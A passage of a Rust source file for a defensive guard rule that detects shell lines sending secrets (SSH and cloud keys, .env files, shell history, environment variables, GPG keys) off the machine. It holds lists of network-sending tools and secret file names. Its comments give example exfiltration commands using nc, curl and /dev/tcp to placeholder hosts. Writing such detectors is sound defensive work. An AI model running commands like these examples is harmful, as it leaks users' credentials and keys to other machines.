//! The rule about secrets leaving the machine: a key, a credential, an
//! `.env` file or the environment sent to another machine, by an upload, a
//! copy to a remote destination, or a pipeline that ends in a program that
//! sends its input.
//!
//! A secret is a file the path model calls sensitive (`~/.ssh`, `~/.aws`),
//! an `.env` or `.envrc` file or a shell's history anywhere, the whole
//! environment, the GPG secret keys `gpg` exports, or a file the line wrote
//! from one of them. Reading one on this machine is nothing; only sending it
//! is.

use std::borrow::Cow;
use std::collections::{HashMap, HashSet};
use std::ops::Range;

use milo_guards_core::spelling::glob;
use milo_guards_core::{Flavour, Sensitivity};

use super::files::remote;
use super::Checker;
use crate::launch::{code_options, valued_options, INTERPRETERS};
use crate::path::{Access, Place};
use crate::unit::{has_flag, operands, referenced, Arg, Nested, Stage, Unit};
use crate::{Rule, Shell};

const ENVIRONMENT: &str = "your environment variables";
const DOTENV: &str = "an .env file";
const ENVRC: &str = "an .envrc file";
const HISTORY: &str = "your shell history";
const GPG: &str = "your GPG keys";
const HOME: &str = "your home directory";
/// A folder that holds the workspace, which may hold an `.env` file.
const WORKSPACE: &str = "your workspace";
/// What core calls the root of a disk, which holds the home directory.
const ROOT: &str = "the root of the disk";

/// The ends of an `.env` file's name that make it a template, committed
/// with the code: `.env.example`.
const TEMPLATES: [&str; 4] = ["example", "sample", "template", "dist"];

/// The ends of an `.env` file's name that say it is encrypted, made to be
/// committed or sent: `.env.gpg`, `.env.vault`.
const ENCRYPTED: [&str; 5] = ["gpg", "pgp", "age", "enc", "vault"];

/// The files a shell or a prompt keeps every line typed into it in, a
/// secret typed on one among them, in lower case.
const HISTORIES: [&str; 12] = [
    ".bash_history",
    ".zsh_history",
    ".zhistory",
    ".sh_history",
    ".ksh_history",
    ".history",
    "fish_history",
    "consolehost_history.txt",
    ".python_history",
    ".node_repl_history",
    ".psql_history",
    ".mysql_history",
];

/// Programs that print what they are given as a name, a listing, a count or
/// a hash, never what a file holds: `echo .env`, `ls ~/.ssh`,
/// `sha256sum .env`.
const NAMES_ONLY: &[&str] = &[
    "echo",
    "printf",
    "ls",
    "basename",
    "dirname",
    "realpath",
    "readlink",
    "stat",
    "du",
    "file",
    "wc",
    "test",
    "[",
    "md5sum",
    "md5",
    "sha1sum",
    "sha224sum",
    "sha256sum",
    "sha384sum",
    "sha512sum",
    "shasum",
    "b2sum",
    "b3sum",
    "cksum",
    "sum",
];

/// The kinds of `socat` address that reach another machine.
const SOCAT_NETWORK: [&str; 10] = [
    "tcp",
    "udp",
    "ssl",
    "openssl",
    "sctp",
    "socks",
    "proxy",
    "dccp",
    "ip-sendto",
    "vsock",
];

/// The kinds of `socat` address that open a file to read.
const SOCAT_FILES: [&str; 4] = ["file", "open", "gopen", "readfile"];

/// The programs that read their attachments' names from `-a` and `-A`.
const MAILERS: [&str; 5] = ["mail", "mailx", "s-nail", "mutt", "neomutt"];

/// Programs that send what they are given to another machine, so a secret
/// in their arguments, in a substitution they run or in a variable they
/// read has left.
const NETWORK: &[&str] = &[
    "curl",
    "wget",
    "fetch",
    "http",
    "https",
    "xh",
    "aria2c",
    "invoke-webrequest",
    "invoke-restmethod",
    "start-bitstransfer",
    "send-mailmessage",
    "nc",
    "nc.openbsd",
    "nc.traditional",
    "ncat",
    "netcat",
    "socat",
    "telnet",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "rclone",
    "sshpass",
    "mosh",
    "mail",
    "mailx",
    "s-nail",
    "sendmail",
    "msmtp",
    "mutt",
    "neomutt",
];

/// Programs that send their input as they get it.
const SINKS: &[&str] = &[
    "nc",
    "nc.openbsd",
    "nc.traditional",
    "ncat",
    "netcat",
    "socat",
    "telnet",
    "ssh",
    "sshpass",
    "mosh",
    "mail",
    "mailx",
    "s-nail",
    "sendmail",
    "msmtp",
    "mutt",
    "neomutt",
    "invoke-webrequest",
    "invoke-restmethod",
    "send-mailmessage",
];

/// Programs beside [`NETWORK`] and [`SINKS`] that this rule sends with: the
/// cloud copiers, which copy to a bucket, a TLS client, which sends its
/// input, and `gh gist create`, which posts files.
const COPIERS: &[&str] = &["aws", "gsutil", "gcloud", "az", "openssl", "gh"];

/// Programs that name a key or a certificate they use to log in, which they
/// do not send: `ssh -i ~/.ssh/id_ed25519 host`.
const KEY_USERS: &[&str] = &[
    "ssh", "scp", "sftp", "rsync", "curl", "wget", "http", "https", "xh", "git", "sshpass", "mosh",
    "rclone",
];

/// The options of those programs whose value is such a file.
const LOGIN_OPTIONS: &[&str] = &[
    "-i",
    "-F",
    "-o",
    "-E",
    "-K",
    "--key",
    "--cert",
    "--cacert",
    "--identity-file",
    "--netrc-file",
    "--config",
];

/// `curl`'s short options that take a value and send none of it from a file.
const CURL_VALUES: &str = "AbcCDeEKmoPQrtuUwxXyYz";

/// The options that take a value, for each program that copies to another
/// machine, so a value is not read as a file to send.
const SCP_VALUES: [&str; 9] = ["-c", "-D", "-F", "-i", "-J", "-l", "-o", "-P", "-S"];
const SFTP_VALUES: [&str; 13] = [
    "-B", "-b", "-c", "-D", "-F", "-i", "-J", "-l", "-o", "-P", "-R", "-S", "-s",
];
const RSYNC_VALUES: [&str; 25] = [
    "-e",
    "--rsh",
    "--exclude",
    "--include",
    "--filter",
    "-f",
    "--files-from",
    "--exclude-from",
    "--include-from",
    "--log-file",
    "--password-file",
    "--port",
    "--backup-dir",
    "--suffix",
    "-T",
    "--temp-dir",
    "--chmod",
    "--chown",
    "--compare-dest",
    "--copy-dest",
    "--link-dest",
    "--partial-dir",
    "--timeout",
    "--bwlimit",
    "-M",
];
const CLOUD_VALUES: [&str; 31] = [
    "--exclude",
    "--include",
    "--filter",
    "--exclude-from",
    "--include-from",
    "--filter-from",
    "--files-from",
    "--config",
    "--profile",
    "--region",
    "--endpoint-url",
    "--acl",
    "--storage-class",
    "--sse",
    "--sse-kms-key-id",
    "--cache-control",
    "--content-type",
    "--content-encoding",
    "--metadata",
    "--bwlimit",
    "--transfers",
    "--checkers",
    "--retries",
    "--log-file",
    "--log-level",
    "--backup-dir",
    "--suffix",
    "--max-age",
    "--min-age",
    "--max-size",
    "--min-size",
];
const GSUTIL_VALUES: [&str; 3] = ["-h", "-o", "-x"];

/// The most times the line is followed again for the files it wrote from a
/// secret through what a command prints (see [`Checker::trace`]): `k=$(cat
/// a); echo "$k" > b` needs the line followed again once `a` is known to hold
/// a secret. A copy, a link, an archive and a redirect of a file's contents
/// are followed apart, to any depth, in each pass. A line that still writes
/// a new one after this many passes is unreadable.
const MAX_PASSES: usize = 4;

/// The most names one `curl -T` value is expanded into by curl's own `{a,b}`
/// lists: past this, the value is read as written.
const MAX_CURL_GLOB: usize = 256;

/// A secret found, as a reason says it and as the line wrote it.
#[derive(Debug, Clone)]
struct Hit {
    words: &'static str,
    target: String,
}

/// Where the line reads secrets, and where what it reads goes, by unit
/// (an index in the split).
#[derive(Debug, Default)]
pub(super) struct Flow {
    /// Whether the line has a unit that can send anything. When none can,
    /// nothing is followed and nothing is sent.
    active: bool,
    /// Whether the line wrote files from a secret further than
    /// [`MAX_PASSES`] follow: what it sends is not known.
    unfollowed: bool,
    /// A secret the unit itself reads: an argument that names one, the
    /// environment, a variable that holds one, a file redirected onto it.
    own: Vec<Option<Hit>>,
    /// A secret read for the unit: in a substitution, a here-document or a
    /// variable among its arguments.
    fed: Vec<Option<Hit>>,
    /// A secret redirected onto its input (`nc host 1 < ~/.ssh/id`).
    stdin: Vec<Option<Hit>>,
    /// Units whose output a redirect sends to the network
    /// (`> /dev/tcp/host/1`).
    to_network: Vec<bool>,
    /// Where each unit stands in a pipeline: its own stage, or the one of the
    /// command whose script, substitution or `-exec` it runs for.
    stage_of: Vec<Option<Stage>>,
    /// For each pipeline, the first stage that reads a secret. A secret read
    /// in a pipeline that runs in a stage of another counts for that stage.
    stage: HashMap<usize, (usize, Hit)>,
    /// The stage of an outer pipeline that a pipeline runs in.
    parent: HashMap<usize, Stage>,
    /// The files the line writes from a secret, by their key (see
    /// [`crate::path::Resolver::file_key`]): each is that secret for the rest
    /// of the line.
    written: HashMap<String, Hit>,
    /// The first unit that sources a secret file (`source .env`), and what
    /// it holds: every variable a later unit reads may be one it set.
    sourced: Option<(usize, Hit)>,
    /// Each unit that calls a function or an alias the line defines, by
    /// index: what the call is given, and whether a body it may run sends.
    calls: HashMap<usize, Call>,
}

/// A file the line copies, links, packs or redirects into another.
#[derive(Debug)]
struct Copy {
    /// The unit that copies it.
    at: usize,
    from: Arg,
    from_key: Option<String>,
    /// The key of the file it lands in, and that file as written.
    to: String,
    target: String,
    /// Whether a whole folder is copied: then the home directory counts as
    /// a secret.
    whole: bool,
    /// Whether the workspace, which may hold an `.env` file, counts too: a
    /// whole folder copied with no exclude that leaves every secret out.
    workspace: bool,
}

/// A call of a function or an alias the line defines.
#[derive(Debug, Default)]
struct Call {
    /// A secret the call names in its own words (`f .env`), which a body
    /// that sends may send (`f() { curl -T "$1" …; }`).
    given: Option<Hit>,
    /// Whether a body the call may run sends anything, itself or by a call
    /// of its own: then what the call is given, piped or redirected may
    /// leave.
    sends: bool,
}

impl Flow {
    fn own(&self, at: usize) -> Option<&Hit> {
        self.own.get(at).and_then(Option::as_ref)
    }

    fn fed(&self, at: usize) -> Option<&Hit> {
        self.fed.get(at).and_then(Option::as_ref)
    }

    fn stdin(&self, at: usize) -> Option<&Hit> {
        self.stdin.get(at).and_then(Option::as_ref)
    }

    fn stage_of(&self, at: usize) -> Option<Stage> {
        self.stage_of.get(at).copied().flatten()
    }

    /// The secret an earlier stage of the pipeline `stage` is in reads, or
    /// of a pipeline that one runs in, and so on outwards: what a unit at
    /// `stage` is handed.
    fn piped(&self, mut stage: Stage) -> Option<&Hit> {
        loop {
            let read = self
                .stage
                .get(&stage.pipeline)
                .filter(|(first, _)| *first < stage.index);
            if let Some((_, hit)) = read {
                return Some(hit);
            }
            stage = *self.parent.get(&stage.pipeline)?;
        }
    }
}

impl Checker<'_> {
    /// Follow every secret the line reads: which units read one, and which
    /// are handed one. A file the line writes from a secret holds it too:
    /// what it copies, links or packs from one is found from the copies the
    /// line makes, to any depth, and the line is followed again with the
    /// files it wrote from what a command printed, until no new one is
    /// written. Past [`MAX_PASSES`] the flow is marked unfollowed.
    pub(super) fn trace(&self) -> Flow {
        if !self.can_send() {
            return Flow::default();
        }
        let copies = self.copies();
        let mut written = self.copied(&copies, HashMap::new());
        let mut flow = self.trace_with(written.clone());
        for pass in 1..=MAX_PASSES {
            let before = written.len();
            for (key, hit) in self.secret_writes(&flow) {
                written.entry(key).or_insert(hit);
            }
            written = self.copied(&copies, written);
            if written.len() == before {
                break;
            }
            if pass == MAX_PASSES {
                flow.unfollowed = true;
                break;
            }
            flow = self.trace_with(written.clone());
        }
        flow
    }

    /// Every file the line copies, links, packs or redirects into another:
    /// what one holds, the other then holds.
    fn copies(&self) -> Vec<Copy> {
        let units = &self.split.units;
        let mut found = Vec::new();
        for (at, unit) in units.iter().enumerate() {
            let Some(key) = unit.key() else { continue };
            for (from, to, whole, workspace) in copied_by(unit, &key) {
                self.note_copy(&mut found, at, from, &to, (whole, workspace));
            }
        }
        // `cat a > b`, `sort < a > b`: what a command reads, its output holds.
        for redirect in self
            .split
            .redirects
            .iter()
            .filter(|redirect| !redirect.text && !redirect.input)
        {
            let Some(to) = redirect.target.known().filter(|file| !network_device(file)) else {
                continue;
            };
            let inputs = self
                .split
                .redirects
                .iter()
                .filter(|other| other.input && !other.text && other.units == redirect.units)
                .map(|other| (redirect.units.start, other.target.clone()));
            let read = redirect.units.clone().flat_map(|at| {
                let unit = units.get(at);
                let key = unit.and_then(Unit::key);
                let prints = key.as_deref().is_some_and(|key| NAMES_ONLY.contains(&key));
                unit.filter(|_| !prints)
                    .zip(key)
                    .map(|(unit, key)| candidates(unit, &key))
                    .unwrap_or_default()
                    .into_iter()
                    .map(move |from| (at, from))
            });
            let all: Vec<(usize, Arg)> = read.chain(inputs).collect();
            for (at, from) in all {
                self.note_copy(&mut found, at, from, to, (false, false));
            }
        }
        found
    }

    /// Note that the unit at `at` puts what `from` holds into `to`, a whole
    /// folder or not, and with the workspace counted or not (see [`Copy`]).
    fn note_copy(
        &self,
        found: &mut Vec<Copy>,
        at: usize,
        from: Arg,
        to: &str,
        (whole, workspace): (bool, bool),
    ) {
        let Some(unit) = self.split.units.get(at) else {
            return;
        };
        let file = |text: &str| {
            self.resolver
                .file_key(unit.dir.as_ref(), &Arg::Known(text.to_string()), unit.shell)
        };
        let Some(to_key) = file(to) else { return };
        let from_key = self.resolver.file_key(unit.dir.as_ref(), &from, unit.shell);
        found.push(Copy {
            at,
            from,
            from_key,
            to: to_key,
            target: to.to_string(),
            whole,
            workspace,
        });
    }

    /// `written` with every file the copies put a secret into: one whose
    /// source is a secret by its name, the workspace or the home directory
    /// for a copy of a whole folder, or a file already known to hold one,
    /// and a copy of that, to any depth, each file once.
    fn copied(&self, copies: &[Copy], mut written: HashMap<String, Hit>) -> HashMap<String, Hit> {
        let empty = HashMap::new();
        let mut from: HashMap<&str, Vec<&Copy>> = HashMap::new();
        let mut work: Vec<String> = written.keys().cloned().collect();
        for copy in copies {
            if let Some(key) = &copy.from_key {
                from.entry(key.as_str()).or_default().push(copy);
            }
            let Some(unit) = self.split.units.get(copy.at) else {
                continue;
            };
            let hit = self
                .secret_of(unit, &copy.from, copy.whole, true, &empty)
                .or_else(|| {
                    copy.workspace
                        .then(|| self.workspace(unit, &copy.from))
                        .flatten()
                });
            if let Some(hit) = hit {
                if !written.contains_key(&copy.to) {
                    written.insert(
                        copy.to.clone(),
                        Hit {
                            words: hit.words,
                            target: copy.target.clone(),
                        },
                    );
                    work.push(copy.to.clone());
                }
            }
        }
        while let Some(key) = work.pop() {
            let Some(words) = written.get(&key).map(|hit| hit.words) else {
                continue;
            };
            for copy in from.get(key.as_str()).into_iter().flatten() {
                if !written.contains_key(&copy.to) {
                    written.insert(
                        copy.to.clone(),
                        Hit {
                            words,
                            target: copy.target.clone(),
                        },
                    );
                    work.push(copy.to.clone());
                }
            }
        }
        written
    }

    /// One pass of [`Self::trace`], with the files known so far to be
    /// written from a secret.
    fn trace_with(&self, written: HashMap<String, Hit>) -> Flow {
        let units = &self.split.units;
        let mut flow = Flow {
            active: true,
            parent: self.split.parents.clone(),
            own: vec![None; units.len()],
            fed: vec![None; units.len()],
            stdin: vec![None; units.len()],
            to_network: vec![false; units.len()],
            stage_of: units.iter().map(|unit| unit.stage).collect(),
            written,
            ..Flow::default()
        };
        let nested = &self.split.nested;
        let calls = self.calls();
        // Outer commands were noted last, and hand their place down first.
        for nested in nested.iter().rev() {
            let outer = nested
                .command
                .clone()
                .find_map(|at| flow.stage_of.get(at).copied().flatten());
            if let Some(outer) = outer {
                for at in nested.inside.clone() {
                    if let Some(slot) = flow.stage_of.get_mut(at).filter(|slot| slot.is_none()) {
                        *slot = Some(outer);
                    }
                }
            }
        }
        // A pipeline inside a command that is a stage of another runs in that
        // stage: the nearest command that holds it says which.
        for nested in nested {
            let outer = nested
                .command
                .clone()
                .find_map(|at| flow.stage_of.get(at).copied().flatten());
            let Some(outer) = outer else { continue };
            for at in nested.inside.clone() {
                let inner = units.get(at).and_then(|unit| unit.stage);
                if let Some(inner) = inner.filter(|inner| inner.pipeline > outer.pipeline) {
                    flow.parent.entry(inner.pipeline).or_insert(outer);
                }
            }
        }
        // A redirect opens before its units run: its target is read once,
        // from where its first unit starts, and the hit goes to them all.
        for redirect in self
            .split
            .redirects
            .iter()
            .filter(|redirect| !redirect.text)
        {
            let Some(first) = units.get(redirect.units.start) else {
                continue;
            };
            if redirect.input {
                let Some(hit) = self.secret_of(first, &redirect.target, false, true, &flow.written)
                else {
                    continue;
                };
                // `exec < .env` makes the file the input of the rest of the
                // line.
                let fed = if replaces_input(first) {
                    redirect.units.start..units.len()
                } else {
                    redirect.units.clone()
                };
                for at in fed {
                    if let Some(slot) = flow.stdin.get_mut(at).filter(|slot| slot.is_none()) {
                        *slot = Some(hit.clone());
                    }
                }
            } else if redirect.target.known().is_some_and(network_device) {
                for at in redirect.units.clone() {
                    if let Some(slot) = flow.to_network.get_mut(at) {
                        *slot = true;
                    }
                }
            }
        }
        for (at, unit) in units.iter().enumerate() {
            let unit = self.aliased(unit);
            let own = self.secret_read(&unit, flow.stdin(at), &flow.written);
            if let Some(slot) = flow.own.get_mut(at) {
                *slot = own;
            }
        }
        for (at, _) in &calls {
            flow.calls.insert(
                *at,
                Call {
                    given: flow.own(*at).cloned(),
                    sends: false,
                },
            );
        }
        self.follow_calls(&mut flow, &calls);
        // What each pipeline's stages and each command's substitutions read
        // so far, for the variables a `read` in a later stage or a `printf
        // -v` sets.
        handed(&mut flow, nested);
        stages(&mut flow);
        // `source .env` sets variables from the file, and `export $(cat
        // .env)` from what a substitution prints, which the line does not
        // show: any variable read after it may hold the secret.
        flow.sourced = units.iter().enumerate().find_map(|(at, unit)| {
            if unit.shell != Shell::Posix {
                return None;
            }
            let hit = match unit.key()?.as_str() {
                "source" | "." => flow.own(at),
                "export" | "declare" | "typeset" | "local" | "readonly"
                    if unit.args.iter().any(sets_from_output) =>
                {
                    flow.fed(at)
                }
                _ => None,
            };
            hit.cloned().map(|hit| (at, hit))
        });
        // A variable set from what a secret-reading command prints holds
        // the secret, and so does one set from that.
        let held = self.held(&flow);
        for (at, unit) in units.iter().enumerate() {
            if let Some(hit) = mentions(unit, &held).or_else(|| sourced(&flow, at, unit)) {
                if let Some(slot) = flow.fed.get_mut(at) {
                    *slot = Some(hit.clone());
                }
                if let Some(slot) = flow.own.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit);
                }
            }
        }
        // A here-string or here-document that expands one is its input.
        for redirect in self.split.redirects.iter().filter(|redirect| redirect.text) {
            let text = redirect.target.text();
            let hit = text_mentions(text, &held).or_else(|| {
                let (from, hit) = flow.sourced.as_ref()?;
                (redirect.units.start > *from && !referenced(text).is_empty()).then(|| hit.clone())
            });
            let Some(hit) = hit else {
                continue;
            };
            for at in redirect.units.clone() {
                if let Some(slot) = flow.stdin.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit.clone());
                }
                if let Some(slot) = flow.own.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit.clone());
                }
            }
        }
        self.follow_calls(&mut flow, &calls);
        handed(&mut flow, nested);
        stages(&mut flow);
        // A substitution, process substitution or script in a command runs
        // with the command's input: `cat .env | curl -d "$(cat)" url`. So the
        // command is handed what the stages before its own read.
        for nested in nested {
            for at in nested.command.clone() {
                let Some(hit) = flow.stage_of(at).and_then(|stage| flow.piped(stage)) else {
                    continue;
                };
                let hit = hit.clone();
                if let Some(slot) = flow.fed.get_mut(at).filter(|slot| slot.is_none()) {
                    *slot = Some(hit);
                }
            }
        }
        flow
    }

    /// Each unit that calls a function or an alias the line defines, with
    /// the bodies the call may run: a body runs where its call stands, in
    /// its stage of a pipeline.
    fn calls(&self) -> Vec<(usize, &[Range<usize>])> {
        self.split
            .units
            .iter()
            .enumerate()
            .filter(|(_, unit)| unit.shell == Shell::Posix)
            .filter_map(|(at, unit)| {
                let bodies = self.split.bodies_of(unit.program.known()?);
                (!bodies.is_empty()).then_some((at, bodies))
            })
            .collect()
    }

    /// What each body a call may run does, found once for each body however
    /// many calls run it: the first secret it reads, and whether it sends
    /// anything. A body that calls another does what that one does, followed
    /// through the calls between bodies to any depth, each body once. Each
    /// call then reads what its bodies read, in its own place in the line
    /// (`f | nc host 1`, `curl -d "$(f)"`, `k=$(f)`), and is noted as
    /// sending when one of them sends.
    fn follow_calls(&self, flow: &mut Flow, calls: &[(usize, &[Range<usize>])]) {
        if calls.is_empty() {
            return;
        }
        let units = &self.split.units;
        let count = units.len();
        // The first unit from each index on that reads a secret, and how many
        // units before each index can send: a body's own answers are a lookup.
        let mut next_read = vec![count; count + 1];
        for at in (0..count).rev() {
            next_read[at] = if flow.own(at).is_some() {
                at
            } else {
                next_read[at + 1]
            };
        }
        let mut senders = vec![0usize; count + 1];
        for (at, unit) in units.iter().enumerate() {
            let sends = unit.key().is_some_and(|key| {
                let key = key.as_str();
                NETWORK.contains(&key) || SINKS.contains(&key) || COPIERS.contains(&key)
            }) || flow.to_network.get(at).copied().unwrap_or(false);
            senders[at + 1] = senders[at] + usize::from(sends);
        }
        // Every body, once.
        let mut ids: HashMap<(usize, usize), usize> = HashMap::new();
        let mut bodies: Vec<Range<usize>> = Vec::new();
        for (_, called) in calls {
            for body in *called {
                ids.entry((body.start, body.end)).or_insert_with(|| {
                    bodies.push(body.clone());
                    bodies.len() - 1
                });
            }
        }
        let mut read: Vec<Option<Hit>> = bodies
            .iter()
            .map(|body| {
                let first = next_read.get(body.start).copied().unwrap_or(count);
                (first < body.end)
                    .then(|| flow.own(first).cloned())
                    .flatten()
            })
            .collect();
        let mut sends: Vec<bool> = bodies
            .iter()
            .map(|body| {
                let end = body.end.min(count);
                let start = body.start.min(end);
                senders[end] > senders[start]
            })
            .collect();
        // Which bodies call each body: a call that stands inside a body.
        let mut callers: Vec<Vec<usize>> = vec![Vec::new(); bodies.len()];
        for (caller, body) in bodies.iter().enumerate() {
            let first = calls.partition_point(|(at, _)| *at < body.start);
            for (_, called) in calls[first..].iter().take_while(|(at, _)| *at < body.end) {
                for callee in *called {
                    if let Some(&callee) = ids.get(&(callee.start, callee.end)) {
                        if let Some(list) = callers.get_mut(callee) {
                            list.push(caller);
                        }
                    }
                }
            }
        }
        // What a body does reaches every body that calls it: each body is
        // settled once, so a cycle of calls ends.
        let mut work: Vec<usize> = (0..bodies.len()).collect();
        while let Some(callee) = work.pop() {
            let hit = read.get(callee).cloned().flatten();
            let sending = sends.get(callee).copied().unwrap_or(false);
            for &caller in callers.get(callee).into_iter().flatten() {
                let mut changed = false;
                if let (Some(hit), Some(slot)) = (&hit, read.get_mut(caller)) {
                    if slot.is_none() {
                        *slot = Some(hit.clone());
                        changed = true;
                    }
                }
                if let Some(slot) = sends.get_mut(caller).filter(|slot| sending && !**slot) {
                    *slot = true;
                    changed = true;
                }
                if changed {
                    work.push(caller);
                }
            }
        }
        for (at, called) in calls {
            let ids: Vec<usize> = called
                .iter()
                .filter_map(|body| ids.get(&(body.start, body.end)).copied())
                .collect();
            let hit = ids.iter().find_map(|&id| read.get(id).cloned().flatten());
            if let (Some(hit), Some(slot)) = (hit, flow.own.get_mut(*at)) {
                if slot.is_none() {
                    *slot = Some(hit);
                }
            }
            if ids
                .iter()
                .any(|&id| sends.get(id).copied().unwrap_or(false))
            {
                flow.calls.entry(*at).or_default().sends = true;
            }
        }
    }

    /// A call of an alias the line defines with words of its own, as the
    /// shell runs it: the last command of the alias's value with the call's
    /// words after its own (`alias c='curl -T'; c .env https://x` runs `curl
    /// -T .env https://x`). Any other unit as it is.
    fn aliased<'u>(&self, unit: &'u Unit) -> Cow<'u, Unit> {
        if unit.shell != Shell::Posix || unit.args.is_empty() {
            return Cow::Borrowed(unit);
        }
        let Some(name) = unit
            .program
            .known()
            .filter(|name| self.split.is_alias(name))
        else {
            return Cow::Borrowed(unit);
        };
        let last = self
            .split
            .bodies_of(name)
            .last()
            .and_then(|body| body.end.checked_sub(1))
            .and_then(|at| self.split.units.get(at));
        let Some(last) = last else {
            return Cow::Borrowed(unit);
        };
        Cow::Owned(Unit {
            program: last.program.clone(),
            args: last.args.iter().chain(&unit.args).cloned().collect(),
            wrappers: last.wrappers.clone(),
            ..Unit::clone(unit)
        })
    }

    /// The files the line writes from a secret it reads or is handed, by
    /// their key, with the secret each holds: a redirect of what a unit that
    /// reads or is handed one prints (`env > e.txt`), and what `tee` is
    /// handed. A copy of a file is among [`Self::copies`].
    fn secret_writes(&self, flow: &Flow) -> Vec<(String, Hit)> {
        let units = &self.split.units;
        let handed = |at: usize| {
            flow.own(at)
                .or(flow.fed(at))
                .or_else(|| flow.stage_of(at).and_then(|stage| flow.piped(stage)))
        };
        let mut found = Vec::new();
        let mut note = |unit: &Unit, file: &str, hit: &Hit| {
            let key = self.resolver.file_key(
                unit.dir.as_ref(),
                &Arg::Known(file.to_string()),
                unit.shell,
            );
            if let Some(key) = key {
                found.push((
                    key,
                    Hit {
                        words: hit.words,
                        target: file.to_string(),
                    },
                ));
            }
        };
        for redirect in self
            .split
            .redirects
            .iter()
            .filter(|redirect| !redirect.text && !redirect.input)
        {
            let Some(file) = redirect.target.known().filter(|file| !network_device(file)) else {
                continue;
            };
            let (Some(first), Some(hit)) = (
                units.get(redirect.units.start),
                redirect.units.clone().find_map(handed),
            ) else {
                continue;
            };
            note(first, file, hit);
        }
        for (at, unit) in units.iter().enumerate() {
            if unit.key().as_deref() != Some("tee") {
                continue;
            }
            let Some(hit) = handed(at) else { continue };
            for file in operands(&unit.args, &[]).into_iter().filter_map(Arg::known) {
                note(unit, file, hit);
            }
        }
        found
    }

    /// Whether any unit of the line can send something away: it runs a
    /// program this rule sends with, or a redirect opens a connection. Then
    /// no secret it reads goes anywhere, and following them is skipped.
    fn can_send(&self) -> bool {
        let program = self.split.units.iter().any(|unit| {
            unit.key().is_some_and(|key| {
                let key = key.as_str();
                NETWORK.contains(&key) || SINKS.contains(&key) || COPIERS.contains(&key)
            })
        });
        program
            || self.split.redirects.iter().any(|redirect| {
                !redirect.text
                    && !redirect.input
                    && redirect.target.known().is_some_and(network_device)
            })
    }

    /// The variables that hold a secret, by name: one set from a command
    /// that reads a secret, or from a variable that holds one; one a `for`
    /// takes from such a command; one a `read`, `mapfile` or `printf -v`
    /// sets from a secret it is handed. Each name is settled once, from the
    /// first secret found for it, whatever the order the line sets them in
    /// (a loop or a function runs them again).
    fn held(&self, flow: &Flow) -> HashMap<String, Hit> {
        let units = &self.split.units;
        let assigned = &self.split.assigned;
        // The names a unit reads in its arguments.
        let mut reads: Vec<Vec<String>> = vec![Vec::new(); units.len()];
        for (at, unit) in units.iter().enumerate() {
            if let Some(names) = reads.get_mut(at) {
                names.extend(unit.variables());
            }
        }
        // The names a here-string or here-document reads, once for each, and
        // the units it feeds as a range: not copied into every one of them.
        let mut fed_names: HashMap<String, Vec<&Range<usize>>> = HashMap::new();
        for redirect in self.split.redirects.iter().filter(|redirect| redirect.text) {
            let names: HashSet<String> = referenced(redirect.target.text()).into_iter().collect();
            for name in names {
                fed_names.entry(name).or_default().push(&redirect.units);
            }
        }
        let mut readers: HashMap<&str, Vec<usize>> = HashMap::new();
        let mut work: Vec<(String, Hit)> = Vec::new();
        // Each assignment is handed work once: a name is settled by the
        // first, and whoever reads it is told then.
        let mut queued = vec![false; assigned.len()];
        for (at, one) in assigned.iter().enumerate() {
            let direct = one.inside.clone().find_map(|unit| flow.own(unit).cloned());
            if let Some(hit) = direct {
                queued[at] = true;
                work.push((one.name.clone(), hit));
            }
            let inside = one.inside.clone().filter_map(|unit| reads.get(unit));
            for name in inside.flatten().chain(&one.uses) {
                readers.entry(name).or_default().push(at);
            }
        }
        // `read k < .env`, `cat .env | while read l`, `mapfile -t a < .env`,
        // `printf -v k '%s' "$(cat .env)"`: the names a builtin sets from
        // what it reads or is handed.
        for (at, unit) in units.iter().enumerate() {
            let names = sets(unit);
            if names.is_empty() {
                continue;
            }
            let hit = flow
                .own(at)
                .or(flow.fed(at))
                .or_else(|| flow.stage_of(at).and_then(|stage| flow.piped(stage)));
            if let Some(hit) = hit {
                work.extend(names.into_iter().map(|name| (name, hit.clone())));
            }
        }
        let mut held: HashMap<String, Hit> = HashMap::new();
        while let Some((name, hit)) = work.pop() {
            if held.contains_key(&name) {
                continue;
            }
            let in_arguments = readers.get(name.as_str()).into_iter().flatten();
            // An assignment reads what a here-document feeds any unit in its
            // value.
            let in_text = fed_names
                .get(name.as_str())
                .into_iter()
                .flatten()
                .flat_map(|fed| {
                    assigned.iter().enumerate().filter(move |(_, other)| {
                        other.inside.start < fed.end
                            && fed.start < other.inside.end
                            && other.inside.start < other.inside.end
                    })
                })
                .map(|(reader, _)| reader);
            for reader in in_arguments.copied().chain(in_text) {
                if let Some(slot) = queued.get_mut(reader).filter(|slot| !**slot) {
                    *slot = true;
                    if let Some(one) = assigned.get(reader) {
                        work.push((one.name.clone(), hit.clone()));
                    }
                }
            }
            held.insert(name, hit);
        }
        held
    }

    /// A secret the unit itself reads: the environment, the GPG secret
    /// keys, a file it is given, has on its input, or is handed the names of
    /// by `xargs`. A program that only prints names, a listing or a hash
    /// reads none.
    fn secret_read(
        &self,
        unit: &Unit,
        stdin: Option<&Hit>,
        written: &HashMap<String, Hit>,
    ) -> Option<Hit> {
        let named = self.named_send(unit);
        let unit: &Unit = &named;
        let key = unit.key()?;
        // They print or list keys the machine holds, which are public.
        if matches!(key.as_str(), "ssh-keygen" | "ssh-add") {
            return None;
        }
        if unit.shell != Shell::PowerShell && NAMES_ONLY.contains(&key.as_str()) {
            // Under `xargs` the words it prints are what its input holds
            // (`xargs echo < .env`), and a list of names it is given is
            // read and printed a name to a line (`file -f .env`).
            if unit.wrappers.iter().any(|wrapper| wrapper == "xargs") {
                return stdin.cloned();
            }
            return list_file(&unit.args, &key)
                .and_then(|file| self.secret_of(unit, &file, false, true, written));
        }
        if dumps_environment(unit, &key) {
            return Some(Hit {
                words: ENVIRONMENT,
                target: key,
            });
        }
        if let Some(target) = exports_secret_keys(unit, &key) {
            return Some(Hit { words: GPG, target });
        }
        // `ls ~/.ssh | xargs cat`: the names the stage before lists.
        let listed =
            if unit.args.contains(&Arg::Input) && unit.wrappers.iter().any(|w| w == "xargs") {
                self.expand(unit, &Arg::Input).0
            } else {
                Vec::new()
            };
        candidates(unit, &key)
            .iter()
            .chain(&listed)
            .find_map(|arg| self.secret_of(unit, arg, false, true, written))
            .or_else(|| self.archived(unit, &key, written))
            .or_else(|| stdin.cloned())
    }

    /// What `tar` or `zip` packs onto its output that no name says is a
